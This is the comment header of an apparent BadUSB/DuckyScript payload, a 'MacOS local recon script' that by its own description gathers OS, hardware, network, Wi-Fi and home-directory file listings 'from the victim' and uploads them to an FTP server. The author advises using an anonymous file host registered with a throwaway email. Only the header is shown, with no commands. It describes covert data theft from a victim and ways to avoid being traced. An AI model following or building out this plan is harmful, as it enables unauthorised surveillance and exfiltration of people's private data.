REM Title: MacOS local recon script
REM Author: un1x01d
REM Description: Collects important recon information from the victim. Includes: OS, Hardware, Network, Filesystem, Wifi etc..
REM Target: MacOS 10.0+
REM Version: 1.0
REM Notes: The results will be uploaded to a FTP server. I used https://www.drivehq.com/ with a temp email from https://temp-mail.org/ for the verification email
REM Notes: Part of the script is to generate a list of all the files in the home directory, dependeing on the amount of files the size of the list will vary. Which might take longer to upload. 
REM Usage: Replace the <FTP SERVER> <USERNAME> <PASSWORD> fields with the right values.
